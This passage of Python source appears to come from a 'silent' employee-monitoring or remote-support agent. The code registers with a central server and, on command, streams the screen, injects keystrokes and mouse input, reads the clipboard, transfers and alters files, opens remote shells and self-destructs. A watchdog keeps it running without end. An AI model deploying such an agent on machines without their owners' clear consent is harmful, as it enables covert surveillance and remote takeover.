                        self.macos_ax_ok = check_macos_accessibility_permission(request_if_missing=True)
                    else:
                        self.macos_screen_ok = True
                        self.macos_ax_ok = True

                    with mss.mss() as sct:
                        monitors = self.get_monitors_info(sct)
                        thumb = self.capture_thumbnail_b64(sct)

                    os_label = f"{platform.system()} {platform.release()}"
                    missing_perms = []
                    if IS_MAC:
                        if not self.macos_screen_ok:
                            missing_perms.append("Falta Pantalla")
                        if not self.macos_ax_ok:
                            missing_perms.append("Falta Accesibilidad")
                    if missing_perms:
                        os_label += f" ({', '.join(missing_perms)})"

                    _, _, is_bg = get_windows_session_context() if IS_WINDOWS else (None, self.username, False)
                    hello = {
                        "type": "register",
                        "token": self.token,
                        "agent_id": self.agent_id,
                        "alias": self.alias,
                        "tenant_id": str(self.cfg.get("tenant_id") or ""),
                        "hostname": self.hostname,
                        "username": self.username,
                        "session_id": self.session_id,
                        "session_background": is_bg or (IS_WINDOWS and not bool(thumb)),
                        "os": os_label,
                        "local_ip": self.get_local_ip(),
                        "monitors": monitors,
                        "current_monitor": self.current_monitor,
                        "idle_seconds": get_idle_seconds(),
                        "active_window": get_active_window_title(),
                        "thumbnail": thumb,
                    }
                    await ws.send(json.dumps(hello))
                    self._record_server_contact(force_disk=True)

                    stream_task = asyncio.create_task(self.stream_loop())

                    try:
                        with mss.mss() as input_sct:
                            async for msg in ws:
                                if isinstance(msg, bytes):
                                    continue

                                data = json.loads(msg)
                                mtype = data.get("type")

                                if mtype == "start_stream":
                                    self.streaming = True
                                elif mtype == "stop_stream":
                                    self.streaming = False
                                elif mtype == "set_monitor":
                                    self.current_monitor = int(data.get("monitor_id", 1))
                                elif mtype == "set_stream_config":
                                    if "quality" in data:
                                        self.jpeg_quality = max(20, min(95, int(data["quality"])))
                                    if "fps" in data:
                                        self.target_fps = max(2, min(30, int(data["fps"])))
                                    if "scale" in data:
                                        self.scale_factor = max(0.3, min(1.0, float(data["scale"])))
                                elif mtype == "capture_thumbnail":
                                    await ws.send(json.dumps({
                                        "type": "telemetry",
                                        "idle_seconds": get_idle_seconds(),
                                        "active_window": get_active_window_title(),
                                        "current_monitor": self.current_monitor,
                                        "thumbnail": self.capture_thumbnail_b64(input_sct),
                                    }))
                                elif mtype == "update_alias":
                                    new_alias = data.get("alias", "").strip()
                                    if new_alias:
                                        self.save_alias_locally(new_alias)
                                elif mtype == "assign_agent_id":
                                    assigned_id = str(data.get("agent_id") or "").strip()
                                    assigned_alias = str(data.get("alias") or "").strip()
                                    if assigned_id:
                                        self.save_assigned_identity(assigned_id, assigned_alias)
                                elif mtype == "mouse":
                                    self.handle_mouse_event(data, input_sct)
                                elif mtype == "key":
                                    self.handle_key_event(data)
                                elif mtype == "type_text":
                                    text_to_type = data.get("text", "")
                                    if text_to_type:
                                        self.keyboard.type(text_to_type)
                                elif mtype == "shortcut":
                                    self.handle_shortcut(data.get("combo", ""))
                                elif mtype == "chat_message":
                                    sender = data.get("sender", "Soporte")
                                    text = data.get("text", "")
                                    ts = data.get("timestamp", "")
                                    if text:
                                        self.chat_popup.show_incoming_message(sender, text, ts)
                                elif mtype == "play_audio":
                                    wav_b64 = data.get("wav_b64", "")
                                    if wav_b64:
                                        try:
                                            wav_bytes = base64.b64decode(wav_b64)
                                            self.audio_player.enqueue_wav(wav_bytes)
                                        except Exception:
                                            pass
                                elif mtype == "clipboard_get":
                                    clip_val = read_system_clipboard()
                                    await ws.send(json.dumps({
                                        "type": "clipboard_content",
                                        "text": clip_val,
                                    }))
                                elif mtype == "clipboard_set":
                                    clip_text = str(data.get("text", ""))
                                    auto_paste = bool(data.get("auto_paste", False))
                                    write_system_clipboard(clip_text)
                                    if auto_paste:
                                        await asyncio.sleep(0.08)
                                        self.handle_shortcut("paste")
                                elif mtype == "file_transfer":
                                    ack = self.handle_file_transfer(data)
                                    await ws.send(json.dumps(ack))
                                elif mtype == "shell_open":
                                    s_key = str(data.get("session_key") or "default")[:48]
                                    s_type = str(data.get("shell_type") or "auto")[:20]
                                    try:
                                        sh_lbl = self.shell_mgr.open_session(s_key, shell_type=s_type)
                                        await ws.send(json.dumps({"type": "shell_ready", "session_key": s_key, "shell_label": sh_lbl}))
                                    except Exception as sh_err:
                                        await ws.send(json.dumps({"type": "shell_output", "session_key": s_key, "data": f"Error al iniciar terminal: {sh_err}\r\n", "closed": True}))
                                elif mtype == "shell_input":
                                    s_key = str(data.get("session_key") or "default")[:48]
                                    self.shell_mgr.write_input(s_key, str(data.get("data") or ""))
                                elif mtype == "shell_interrupt":
                                    s_key = str(data.get("session_key") or "default")[:48]
                                    self.shell_mgr.interrupt(s_key)
                                elif mtype == "shell_close":
                                    s_key = str(data.get("session_key") or "default")[:48]
                                    self.shell_mgr.close_session(s_key)
                                elif mtype == "fs_list":
                                    r_key = str(data.get("req_key") or "")[:48]
                                    res = await asyncio.to_thread(RemoteFileExplorer.list_dir, str(data.get("path") or ""), bool(data.get("show_hidden", False)))
                                    await ws.send(json.dumps({"type": "fs_list_res", "req_key": r_key, **res}))
                                elif mtype == "fs_download":
                                    r_key = str(data.get("req_key") or "")[:48]
                                    res = await asyncio.to_thread(RemoteFileExplorer.download_item, str(data.get("path") or ""), bool(data.get("preview", False)))
                                    await ws.send(json.dumps({"type": "fs_download_res", "req_key": r_key, **res}))
                                elif mtype == "fs_upload":
                                    r_key = str(data.get("req_key") or "")[:48]
                                    res = await asyncio.to_thread(RemoteFileExplorer.upload_item, str(data.get("dest_dir") or ""), str(data.get("filename") or ""), str(data.get("data_b64") or ""))
                                    await ws.send(json.dumps({"type": "fs_op_res", "req_key": r_key, **res}))
                                elif mtype == "fs_mutate":
                                    r_key = str(data.get("req_key") or "")[:48]
                                    res = await asyncio.to_thread(RemoteFileExplorer.mutate_item, str(data.get("op") or ""), str(data.get("path") or ""), str(data.get("new_name") or ""))
                                    await ws.send(json.dumps({"type": "fs_op_res", "req_key": r_key, **res}))
                                elif mtype == "sitai_ack":
                                    ack_fname = os.path.basename(str(data.get("filename") or "")).strip()
                                    if ack_fname and ack_fname.endswith(".sitai"):
                                        ack_path = OFFLINE_VAULT_DIR / ack_fname
                                        if ack_path.exists():
                                            try:
                                                ack_path.unlink()
                                            except Exception:
                                                pass
                                elif mtype == "self_destruct":
                                    self.handle_self_destruct()
                                elif mtype == "ping":
                                    await ws.send(json.dumps({"type": "pong"}))
                    finally:
                        stream_task.cancel()
                        self.shell_mgr.close_all()
                        self.ws = None
                        self.streaming = False

            except Exception:
                self.ws = None
                self.streaming = False
                await asyncio.sleep(3.0)


_SINGLE_INSTANCE_LOCK_FH = None
_SINGLE_INSTANCE_MUTEX = None


def acquire_single_instance_lock() -> bool:
    """
    Micro-Función W1: Evita instancias duplicadas del agente cuando el Watchdog
    del sistema operativo (schtasks / cron) verifica periódicamente el servicio.
    Si el agente ya está corriendo, retorna False y la segunda instancia termina en 0ms.
    Si el agente se cerró o cayó, el SO libera el candado automáticamente y el Watchdog lo levanta.
    """
    global _SINGLE_INSTANCE_LOCK_FH, _SINGLE_INSTANCE_MUTEX
    if IS_WINDOWS:
        try:
            kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
            kernel32.CreateMutexW.argtypes = [ctypes.c_void_p, ctypes.c_bool, ctypes.c_wchar_p]
            kernel32.CreateMutexW.restype = ctypes.c_void_p
            ctypes.set_last_error(0)
            handle = kernel32.CreateMutexW(None, False, "Local\\SITAI_JOBMonitor_Agent_Mutex")
            err = ctypes.get_last_error()
            # 183 = ERROR_ALREADY_EXISTS, 5 = ERROR_ACCESS_DENIED (instancia activa con mayor privilegio)
            if not handle or err in (183, 5):
                return False
            _SINGLE_INSTANCE_MUTEX = handle
            return True
        except Exception:
            pass

    lock_path = Path(tempfile.gettempdir()) / "job_monitor_agent.lock"
    try:
        fh = open(lock_path, "a+", encoding="utf-8")
        if IS_WINDOWS:
            import msvcrt
            fh.seek(0)
            msvcrt.locking(fh.fileno(), msvcrt.LK_NBLCK, 1)
        else:
            import fcntl
            fcntl.flock(fh.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
        fh.seek(0)
        fh.truncate()
        fh.write(str(os.getpid()))
        fh.flush()
        _SINGLE_INSTANCE_LOCK_FH = fh
        return True
    except Exception:
        return False


def check_macos_full_disk_access() -> bool:
    """Verifica si el bundle cuenta con Acceso Total al Disco (Privacy_AllFiles) en macOS."""
    if not IS_MACOS:
        return True
    probes = [
        Path("/Library/Preferences/com.apple.TimeMachine.plist"),
        Path.home() / "Library" / "Safari",
        Path.home() / "Library" / "Messages",
    ]
    tested = 0
    for p in probes:
        if not p.exists():
            continue
        tested += 1
        try:
            if p.is_dir():
                os.listdir(p)
            else:
                with open(p, "rb") as fh:
                    fh.read(4)
            return True
        except PermissionError:
            return False
        except Exception:
            continue
    return tested == 0


def main():
    parser = argparse.ArgumentParser(description="Agente Silencioso JOB-Monitor con Watchdog")
    parser.add_argument("--server", type=str, default=None, help="URL WebSocket del Servidor Central")
    parser.add_argument("--token", type=str, default=None, help="Token secreto del servidor")
    parser.add_argument("--alias", type=str, default=None, help="Alias amigable de esta PC (ej. 'PC de Miguel')")
    parser.add_argument("--check-screen-only", action="store_true", help="Verifica permiso TCC de pantalla en macOS")
    parser.add_argument("--check-fda", action="store_true", help="Verifica permiso TCC de Acceso Total al Disco en macOS")
    parser.add_argument("--check-permissions", action="store_true", help="Verifica permisos TCC de pantalla y accesibilidad en macOS")
    parser.add_argument("--request-permissions", action="store_true", help="Solicita permisos TCC de pantalla y accesibilidad en macOS")
    args = parser.parse_args()

    if args.check_screen_only:
        sys.exit(0 if check_macos_screen_permission(request_if_missing=False) else 2)

    if args.check_fda:
        fda_ok = check_macos_full_disk_access()
        try:
            (BASE_DIR / "fda_status.json").write_text(json.dumps({"full_disk": bool(fda_ok)}), encoding="utf-8")
        except Exception:
            pass
        sys.exit(0 if fda_ok else 2)

    if args.check_permissions or args.request_permissions:
        req = bool(args.request_permissions)
        scr_ok = check_macos_screen_permission(request_if_missing=req)
        ax_ok = check_macos_accessibility_permission(request_if_missing=req)
        fda_ok = check_macos_full_disk_access()
        try:
            status_path = BASE_DIR / "permissions_status.json"
            status_path.write_text(
                json.dumps({"screen": bool(scr_ok), "accessibility": bool(ax_ok), "full_disk": bool(fda_ok)}, indent=2),
                encoding="utf-8",
            )
        except Exception:
            pass
        sys.exit(0 if (scr_ok and ax_ok and fda_ok) else 2)

    if not acquire_single_instance_lock():
        # Ya existe una instancia activa del agente ejecutándose en este equipo
        return

    cfg = load_or_create_agent_config(args.server, args.token, args.alias)

    # Watchdog Interno Inmortal: si ocurre cualquier fallo inesperado a nivel de bucle o red,
    # el proceso se auto-reinicia después de 3 segundos sin morir nunca.
    while True:
        try:
            agent = SilentRemoteAgent(cfg)
            asyncio.run(agent.run_forever())
        except KeyboardInterrupt:
            break
        except Exception:
            time.sleep(3.0)


if __name__ == "__main__":
    main()
